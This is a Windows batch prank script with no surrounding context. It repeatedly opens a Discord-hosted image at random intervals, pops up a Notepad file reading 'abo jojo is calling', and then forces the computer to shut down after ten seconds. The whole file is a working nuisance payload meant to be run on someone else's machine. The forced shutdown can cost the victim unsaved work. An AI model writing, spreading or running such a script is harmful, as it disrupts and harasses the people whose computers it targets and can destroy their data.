@echo off
setlocal enabledelayedexpansion

set "URL=https://media.discordapp.net/attachments/1481390366283399304/1554516404202512394/image.png?ex=6abd2bb8&is=6abbda38&hm=e83dde20c57a8758a58f34a1b5112e14692b1e5590ffca7d195799398bdaade6&=&format=webp&quality=lossless&width=833&height=836"

for /l %%i in (1,1,20) do (
    start "" "!URL!"
    set /a delay=!random! %% 10 + 1
    timeout /t !delay! /nobreak >nul
)

echo abo jojo is calling> "%temp%\jojo.txt"
start notepad "%temp%\jojo.txt"

timeout /t 3 /nobreak >nul
shutdown /s /t 10 /c "abo jojo is calling"